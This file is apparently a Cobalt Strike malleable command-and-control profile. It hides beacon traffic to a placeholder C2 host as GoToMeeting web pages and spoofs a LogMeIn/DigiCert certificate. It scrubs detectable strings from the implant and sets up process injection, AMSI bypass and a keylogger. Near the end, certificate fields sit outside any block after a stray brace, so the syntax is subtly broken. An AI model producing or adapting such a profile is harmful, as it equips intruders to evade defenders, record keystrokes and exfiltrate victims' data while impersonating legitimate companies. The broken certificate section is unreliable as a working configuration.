set host_stage "true";
set sleeptime "73000";
set jitter    "11";
set useragent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36";

# Task and Proxy Max Size
set tasks_max_size "1048576";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

set data_jitter "50";
set smb_frame_header "";
set pipename "srvsvc-1-5-5-08020";
set pipename_stager "srvsvc-1-5-5-03846";

set tcp_frame_header "";
set ssh_banner "Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)";
set ssh_pipename "srvsvc-1-5-5-0##";

####Manaully add these if your doing C2 over DNS (Future Release)####
##dns-beacon {
#    set dns_idle             "1.2.3.4";
#    set dns_max_txt          "199";
#    set dns_sleep            "1";
#    set dns_ttl              "5";
#    set maxdns               "200";
#    set dns_stager_prepend   "doc-stg-prepend";
#    set dns_stager_subhost   "doc-stg-sh.";

#    set beacon               "doc.bc.";
#    set get_A                "doc.1a.";
#    set get_AAAA             "doc.4a.";
#    set get_TXT              "doc.tx.";
#    set put_metadata         "doc.md.";
#    set put_output           "doc.po.";
#    set ns_response          "zero";

#}



stage {
        set obfuscate "true";
        set stomppe "true";
        set cleanup "true";
        set userwx "false";
        set smartinject "true";


        #TCP and SMB beacons will obfuscate themselves while they wait for a new connection.
        #They will also obfuscate themselves while they wait to read information from their parent Beacon.
        set sleep_mask "true";


        set checksum       "0";
        set compile_time   "21 Apr 2088 08:58:42";
        set entry_point    "263424";
        set image_size_x86 "495616";
        set image_size_x64 "495616";
        set name           "Windows.UI.BlockedShutdown.dll";
        set rich_header    "\xe4\xce\xe6\x5e\xa0\xaf\x88\x0d\xa0\xaf\x88\x0d\xa0\xaf\x88\x0d\xa9\xd7\x1b\x0d\x96\xaf\x88\x0d\xfb\xc7\x8b\x0c\xa3\xaf\x88\x0d\xfb\xc7\x8c\x0c\x9f\xaf\x88\x0d\xfb\xc7\x8d\x0c\xb8\xaf\x88\x0d\xfb\xc7\x89\x0c\xa9\xaf\x88\x0d\xa0\xaf\x89\x0d\xb9\xae\x88\x0d\xfb\xc7\x88\x0c\xa1\xaf\x88\x0d\xfb\xc7\x81\x0c\xac\xaf\x88\x0d\xfb\xc7\x77\x0d\xa1\xaf\x88\x0d\xfb\xc7\x8a\x0c\xa1\xaf\x88\x0d\x52\x69\x63\x68\xa0\xaf\x88\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";



        transform-x86 {
                prepend "\x90\x90\x90"; # NOP, NOP!
                strrep "ReflectiveLoader" "";
                strrep "This program cannot be run in DOS mode" "";
                strrep "NtQueueApcThread" "";
                strrep "HTTP/1.1 200 OK" "";
                strrep "Stack memory was corrupted" "";
                strrep "beacon.dll" "";
                strrep "ADVAPI32.dll" "";
                strrep "WININET.dll" "";
                strrep "WS2_32.dll" "";
                strrep "DNSAPI.dll" "";
                strrep "Secur32.dll" "";
                strrep "VirtualProtectEx" "";
                strrep "VirtualProtect" "";
                strrep "VirtualAllocEx" "";
                strrep "VirtualAlloc" "";
                strrep "VirtualFree" "";
                strrep "VirtualQuery" "";
                strrep "RtlVirtualUnwind" "";
                strrep "sAlloc" "";
                strrep "FlsFree" "";
                strrep "FlsGetValue" "";
                strrep "FlsSetValue" "";
                strrep "InitializeCriticalSectionEx" "";
                strrep "CreateSemaphoreExW" "";
                strrep "SetThreadStackGuarantee" "";
                strrep "CreateThreadpoolTimer" "";
                strrep "SetThreadpoolTimer" "";
                strrep "WaitForThreadpoolTimerCallbacks" "";
                strrep "CloseThreadpoolTimer" "";
                strrep "CreateThreadpoolWait" "";
                strrep "SetThreadpoolWait" "";
                strrep "CloseThreadpoolWait" "";
                strrep "FlushProcessWriteBuffers" "";
                strrep "FreeLibraryWhenCallbackReturns" "";
                strrep "GetCurrentProcessorNumber" "";
                strrep "GetLogicalProcessorInformation" "";
                strrep "CreateSymbolicLinkW" "";
                strrep "SetDefaultDllDirectories" "";
                strrep "EnumSystemLocalesEx" "";
                strrep "CompareStringEx" "";
                strrep "GetDateFormatEx" "";
                strrep "GetLocaleInfoEx" "";
                strrep "GetTimeFormatEx" "";
                strrep "GetUserDefaultLocaleName" "";
                strrep "IsValidLocaleName" "";
                strrep "LCMapStringEx" "";
                strrep "GetCurrentPackageId" "";
                strrep "UNICODE" "";
                strrep "UTF-8" "";
                strrep "UTF-16LE" "";
                strrep "MessageBoxW" "";
                strrep "GetActiveWindow" "";
                strrep "GetLastActivePopup" "";
                strrep "GetUserObjectInformationW" "";
                strrep "GetProcessWindowStation" "";
                strrep "Sunday" "";
                strrep "Monday" "";
                strrep "Tuesday" "";
                strrep "Wednesday" "";
                strrep "Thursday" "";
                strrep "Friday" "";
                strrep "Saturday" "";
                strrep "January" "";
                strrep "February" "";
                strrep "March" "";
                strrep "April" "";
                strrep "June" "";
                strrep "July" "";
                strrep "August" "";
                strrep "September" "";
                strrep "October" "";
                strrep "November" "";
                strrep "December" "";
                strrep "MM/dd/yy" "";
                strrep "Stack memory around _alloca was corrupted" "";
                strrep "Unknown Runtime Check Error" "";
                strrep "Unknown Filename" "";
                strrep "Unknown Module Name" "";
                strrep "Run-Time Check Failure #%d - %s" "";
                strrep "Stack corrupted near unknown variable" "";
                strrep "Stack pointer corruption" "";
                strrep "Cast to smaller type causing loss of data" "";
                strrep "Stack memory corruption" "";
                strrep "Local variable used before initialization" "";
                strrep "Stack around _alloca corrupted" "";
                strrep "RegOpenKeyExW" "";
                strrep "egQueryValueExW" "";
                strrep "RegCloseKey" "";
                strrep "LibTomMath" "";
                strrep "Wow64DisableWow64FsRedirection" "";
                strrep "Wow64RevertWow64FsRedirection" "";
                strrep "Kerberos" "";

                }

        transform-x64 {
                prepend "\x90\x90\x90"; # NOP, NOP!
                strrep "ReflectiveLoader" "";
                strrep "This program cannot be run in DOS mode" "";
                strrep "beacon.x64.dll" "";
                strrep "NtQueueApcThread" "";
                strrep "HTTP/1.1 200 OK" "";
                strrep "Stack memory was corrupted" "";
                strrep "beacon.dll" "";
                strrep "ADVAPI32.dll" "";
                strrep "WININET.dll" "";
                strrep "WS2_32.dll" "";
                strrep "DNSAPI.dll" "";
                strrep "Secur32.dll" "";
                strrep "VirtualProtectEx" "";
                strrep "VirtualProtect" "";
                strrep "VirtualAllocEx" "";
                strrep "VirtualAlloc" "";
                strrep "VirtualFree" "";
                strrep "VirtualQuery" "";
                strrep "RtlVirtualUnwind" "";
                strrep "sAlloc" "";
                strrep "FlsFree" "";
                strrep "FlsGetValue" "";
                strrep "FlsSetValue" "";
                strrep "InitializeCriticalSectionEx" "";
                strrep "CreateSemaphoreExW" "";
                strrep "SetThreadStackGuarantee" "";
                strrep "CreateThreadpoolTimer" "";
                strrep "SetThreadpoolTimer" "";
                strrep "WaitForThreadpoolTimerCallbacks" "";
                strrep "CloseThreadpoolTimer" "";
                strrep "CreateThreadpoolWait" "";
                strrep "SetThreadpoolWait" "";
                strrep "CloseThreadpoolWait" "";
                strrep "FlushProcessWriteBuffers" "";
                strrep "FreeLibraryWhenCallbackReturns" "";
                strrep "GetCurrentProcessorNumber" "";
                strrep "GetLogicalProcessorInformation" "";
                strrep "CreateSymbolicLinkW" "";
                strrep "SetDefaultDllDirectories" "";
                strrep "EnumSystemLocalesEx" "";
                strrep "CompareStringEx" "";
                strrep "GetDateFormatEx" "";
                strrep "GetLocaleInfoEx" "";
                strrep "GetTimeFormatEx" "";
                strrep "GetUserDefaultLocaleName" "";
                strrep "IsValidLocaleName" "";
                strrep "LCMapStringEx" "";
                strrep "GetCurrentPackageId" "";
                strrep "UNICODE" "";
                strrep "UTF-8" "";
                strrep "UTF-16LE" "";
                strrep "MessageBoxW" "";
                strrep "GetActiveWindow" "";
                strrep "GetLastActivePopup" "";
                strrep "GetUserObjectInformationW" "";
                strrep "GetProcessWindowStation" "";
                strrep "Sunday" "";
                strrep "Monday" "";
                strrep "Tuesday" "";
                strrep "Wednesday" "";
                strrep "Thursday" "";
                strrep "Friday" "";
                strrep "Saturday" "";
                strrep "January" "";
                strrep "February" "";
                strrep "March" "";
                strrep "April" "";
                strrep "June" "";
                strrep "July" "";
                strrep "August" "";
                strrep "September" "";
                strrep "October" "";
                strrep "November" "";
                strrep "December" "";
                strrep "MM/dd/yy" "";
                strrep "Stack memory around _alloca was corrupted" "";
                strrep "Unknown Runtime Check Error" "";
                strrep "Unknown Filename" "";
                strrep "Unknown Module Name" "";
                strrep "Run-Time Check Failure #%d - %s" "";
                strrep "Stack corrupted near unknown variable" "";
                strrep "Stack pointer corruption" "";
                strrep "Cast to smaller type causing loss of data" "";
                strrep "Stack memory corruption" "";
                strrep "Local variable used before initialization" "";
                strrep "Stack around _alloca corrupted" "";
                strrep "RegOpenKeyExW" "";
                strrep "egQueryValueExW" "";
                strrep "RegCloseKey" "";
                strrep "LibTomMath" "";
                strrep "Wow64DisableWow64FsRedirection" "";
                strrep "Wow64RevertWow64FsRedirection" "";
                strrep "Kerberos" "";
                }
}


process-inject {
    # set remote memory allocation technique
        set allocator "NtMapViewOfSection";

    # shape the content and properties of what we will inject
    set min_alloc "24757";
    set userwx    "false";
    set startrwx "true";

    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    # specify how we execute code in the remote process
    execute {
                CreateThread "ntdll.dll!RtlUserThreadStart+0x1174";
        NtQueueApcThread-s;
        SetThreadContext;
        CreateRemoteThread;
                CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        RtlCreateUserThread;
        }
}

post-ex {
    # control the temporary process we spawn to

        set spawnto_x86 "%windir%\\syswow64\\bootcfg.exe";
        set spawnto_x64 "%windir%\\sysnative\\bootcfg.exe";

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";

    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";

    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";

        # control the method used to log keystrokes
        set keylogger "SetWindowsHookEx";
}


http-config {
        set headers "Server, Content-Type, Brightspot-Id, Cache-Control, X-Content-Type-Options, X-Powered-By, Vary, Connection";
        header "Content-Type" "text/html;charset=UTF-8";
        header "Connection" "close";
        header "Brightspot-Id" "00000459-72af-a783-feef2189";
        header "Cache-Control" "max-age=2126550";
        header "Server" "Apache-Coyote/1.1";
        header "X-Content-Type-Options" "nosniff";
        header "X-Powered-By" "Brightspot";
        header "Vary" "Accept-Encoding";
        set trust_x_forwarded_for "false";

}

http-get {

set uri "/functionalStatus/rLgKXwFLYL-oUXyj-5R8zfTasl1dEv ";


client {

        header "Host" "sample.domain";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";

        metadata {
        base64url;
        parameter "_";

        }

}

server {

        output {

                base64url;

        prepend "content=";
        prepend "<meta name=\"google-site-verification\"\n";
        prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
        prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
        prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
        prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
        prepend "        <meta charset=\"UTF-8\">\n";
        prepend "    <head>\n";
        prepend "<html lang=\"en\">\n";
        prepend "<!DOCTYPE html>\n";

        append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
        append "<script type=\"text/javascript\">\n";
        append "  var _kiq = _kiq || [];\n";
        append "  (function(){\n";
        append "    setTimeout(function(){\n";
        append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
        append "d.createElement('script'); s.type = 'text/javascript';\n";
        append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
        append "f.parentNode.insertBefore(s, f);\n";
        append "    }, 1);\n";
        append "})();\n";
        append "</script>\n";
        append "</body>\n";
        append "</html>\n";
                print;
        }
}
}

http-post {

set uri "/rest/2/meetingsODbRnXvXJPn6MBLP20YLxP-mp ";

set verb "GET";

client {

        header "Host" "sample.domain";
        header "Accept" "*/*";
        header "Accept-Language" "en";
        header "Connection" "close";

        output {
                base64url;
        parameter "includeMeetingsICoorganize";
        }


        id {
                base64url;
        parameter "includeCoorganizers";

        }
}

server {

        output {
                base64url;

        prepend "content=";
        prepend "<meta name=\"google-site-verification\"\n";
        prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
        prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
        prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
        prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
        prepend "        <meta charset=\"UTF-8\">\n";
        prepend "    <head>\n";
        prepend "<html lang=\"en\">\n";
        prepend "<!DOCTYPE html>\n";

        append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
        append "<script type=\"text/javascript\">\n";
        append "  var _kiq = _kiq || [];\n";
        append "  (function(){\n";
        append "    setTimeout(function(){\n";
        append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
        append "d.createElement('script'); s.type = 'text/javascript';\n";
        append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
        append "f.parentNode.insertBefore(s, f);\n";
        append "    }, 1);\n";
        append "})();\n";
        append "</script>\n";
        append "</body>\n";
        append "</html>\n";
                print;
        }
}
}

http-stager {

set uri_x86 "/Meeting/HQ20ML/";
set uri_x64 "/Meeting/HQ20ML/";

client {
        header "Host" "sample.domain";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
}

server {

}


}



set CN       "sample.domain"; #Common Name
set O        "LogMeIn Inc."; #Organization Name
set C        "US"; #Country
set L        "Boston"; #Locality
set OU       "DigiCert Inc"; #Organizational Unit Name
set ST       "Massachusetts"; #State or Province
set validity "365"; #Number of days the cert is valid for
}

set CN       "sample.domain"; #Common Name

https-certificate {
    set keystore "sample.domain.store"
    set password "sample_password"
}
